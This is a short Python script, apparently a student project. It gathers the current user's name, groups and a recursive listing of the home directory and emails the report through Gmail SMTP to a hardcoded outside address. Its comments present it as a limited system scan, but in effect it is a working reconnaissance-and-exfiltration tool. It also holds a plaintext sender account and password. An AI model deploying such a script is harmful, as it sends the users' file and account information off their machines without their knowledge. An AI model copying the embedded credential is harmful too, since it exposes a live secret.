import os
import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def collect_system_info():
    info = []

    # Collect user information (limited to current user)
    info.append("Current User:\n")
    info.append(subprocess.getoutput("whoami"))

    # Collect group information (limited to current user's groups)
    info.append("\nCurrent User Groups:\n")
    info.append(subprocess.getoutput("groups"))

    # Collect file system information (limited to accessible directories)
    info.append("\nFile System (Limited Access):\n")
    info.append(subprocess.getoutput("ls -lR ~"))

    return "\n".join(info)

def send_email(report, recipient_email):
    sender_email = "9534@holbertonstudents.com"
    sender_password = "ksubhijgicokabix"

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = "System Scan Report"

    msg.attach(MIMEText(report, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Failed to send email: {e}")

if __name__ == "__main__":
    report = collect_system_info()
    recipient_email = "9534@holbertonstudents.com"
    send_email(report, recipient_email)
